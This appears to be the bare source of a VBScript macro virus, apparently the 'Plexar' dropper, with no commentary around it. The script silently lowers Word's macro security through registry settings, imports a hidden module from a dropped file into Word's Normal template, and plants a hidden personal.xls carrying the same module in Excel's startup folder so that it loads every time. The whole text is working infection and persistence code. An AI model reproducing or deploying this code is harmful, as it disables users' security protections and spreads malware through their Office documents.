On Error Resume Next
Set Word = CreateObject("Word.Application")
If (Word <> "") Then
Word.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1"
Word.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Security", "Level") = "1"
Set maca = Word.Application.NormalTemplate.VBProject.VBComponents
If maca.Item("Plexar").Name <> "Plexar" Then
maca.Import "c:\raxelp.$$$"
Word.Application.NormalTemplate.Save
End If
End If
Set fso = CreateObject("Scripting.FileSystemObject")
Set excel = CreateObject("Excel.Application")
If (excel <> "") Then
yyy = excel.Application.StartupPath & "\personal.xls"
If (fso.FileExists(yyy) = False) Then
excel.Workbooks.Add.SaveAs yyy
excel.Application.ActiveWorkbook.VBProject.VBComponents.Import "c:\raxelp.$$$"
excel.ActiveWindow.Visible = Not -1
excel.Workbooks("personal.xls").Save
End If
excel.Application.Quit
End If
